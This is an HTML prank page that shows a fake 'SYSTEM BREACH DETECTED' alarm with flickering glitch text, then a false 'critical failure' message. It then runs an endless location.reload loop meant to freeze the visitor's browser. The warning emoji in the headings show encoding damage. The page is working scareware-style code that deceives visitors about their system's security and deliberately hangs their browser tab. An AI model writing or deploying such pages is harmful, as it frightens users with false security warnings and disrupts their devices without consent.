<!DOCTYPE html>
<html>
<head>
  <title>System Breach</title>
  <style>
    body {
      background: black;
      color: #00ff00;
      font-family: monospace;
      text-align: center;
      overflow: hidden;
    }
    .glitch {
      position: absolute;
      font-size: 20px;
      animation: flicker 0.1s infinite alternate;
    }
    @keyframes flicker {
      from { opacity: 1; }
      to { opacity: 0.2; transform: translate(3px, -3px); }
    }
  </style>
</head>
<body>
  <h1>âš  SYSTEM BREACH DETECTED âš </h1>
  <p>Stabilizing system memory...</p>

  <script>
    // Build-up: spam glitch text for dramatic effect
    let count = 0;
    const glitchChars = "!@#$%^&*()_+=-{}[]|:;<>,.?/";
    
    function randomText(length = 10) {
      return Array.from({ length }, () => glitchChars[Math.floor(Math.random() * glitchChars.length)]).join('');
    }

    const glitchInterval = setInterval(() => {
      const el = document.createElement("div");
      el.className = "glitch";
      el.innerText = randomText();
      el.style.left = Math.random() * window.innerWidth + "px";
      el.style.top = Math.random() * window.innerHeight + "px";
      el.style.color = ["#0f0", "#f00", "#0ff", "#f0f"][Math.floor(Math.random() * 4)];
      document.body.appendChild(el);
      setTimeout(() => el.remove(), 1000);
      count++;
      if (count >= 100) {
        clearInterval(glitchInterval);
        activateCrash();
      }
    }, 50);

    function activateCrash() {
      // Final warning
      document.body.innerHTML = '<h1 style="color:red;">ðŸ’€ SYSTEM OVERLOAD ðŸ’€</h1><p>Critical failure detected. Rebooting system...</p>';
      
      // Delay for dramatic effect, then crash using reload loop
      setTimeout(() => {
        while (1) location.reload(1);
      }, 2000);
    }
  </script>
</body>
</html>
